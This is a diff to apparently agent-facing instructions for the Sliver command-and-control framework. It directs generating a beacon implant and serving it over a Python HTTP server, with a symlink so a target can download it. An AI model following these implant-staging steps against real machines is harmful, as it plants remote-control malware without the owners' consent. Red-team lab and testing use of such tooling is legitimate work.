@@ -115,6 +115,8 @@ Generate a new implant with:
 - is_beacon: `true`
 - beacon_interval_seconds: `5`
 
+All beacon commands now block and wait for results, so use them like session commands.
+
 Then use `bash` to:
 1. Start a Python HTTP server on port 8888: `python3 -m http.server 8888 --directory /tmp/pi-sliver &`
 2. Create a symlink so the target can find it: `ln -sf /tmp/pi-sliver/IMPLANT_NAME /tmp/pi-sliver/implant` (replace IMPLANT_NAME with the actual random name from the generate response)
